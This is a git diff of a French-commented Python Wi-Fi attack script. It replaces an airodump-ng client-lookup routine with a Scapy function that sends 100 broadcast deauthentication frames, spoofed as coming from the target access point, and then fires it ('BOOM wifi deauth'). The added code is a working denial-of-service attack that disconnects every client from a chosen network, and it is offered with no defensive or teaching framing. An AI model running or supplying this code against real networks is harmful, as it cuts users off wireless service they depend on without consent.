@@ -58,43 +58,16 @@ display_wifi_networks(networks)
 
 #prise d'infos (client pour deauth)
 if bssid != False:
+    #pas besoin d'avoir le MAC du client pour deauth...
     
-    def execute_command(command):
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output, error = process.communicate()
-        print("Output:")
-        print(output.decode())
-    
-    command = f"airodump-ng --bssid {bssid} --channel {channel} {wlanmon}"
-    
-    # Définition de la fonction pour exécuter la commande dans un thread avec un timeout
-    def execute_command_with_timeout():
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    
-        def timeout_handler():
-            process.terminate()
-    
-        timeout = 5
-        timer = threading.Timer(timeout, timeout_handler)
-        timer.start()
-    
-        stdout, stderr = process.communicate()
-        timer.cancel()
-    
-        output = str(stdout.decode())
+    def deauth_wifi(bssid, interface):
+        #addresse client mis sur une valeure NULL pour ne pas a avoir a trouvé un client heheheheh
+        packet = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid)/Dot11Deauth()
+        sendp(packet, iface=interface, count=100, inter=0.1, verbose=1)
 
-        #me trouver la MAC du client sur la wifi 
-        lines = output.split("\n")
-        last_line = lines[-1].strip()
-        mac_addresses = last_line.split()
-        if len(mac_addresses) >= 2:
-            client = mac_addresses[1]
-            print("Client:", client)
-        else:
-            print("No client found.")
-    
-    # Appel de la fonction pour exécuter la commande avec le timeout
-    execute_command_with_timeout()
+    # BOOM wifi deauth
+
+    deauth_wifi(bssid, interface)
 
 else:
     print("[-] Aucun réseau !")
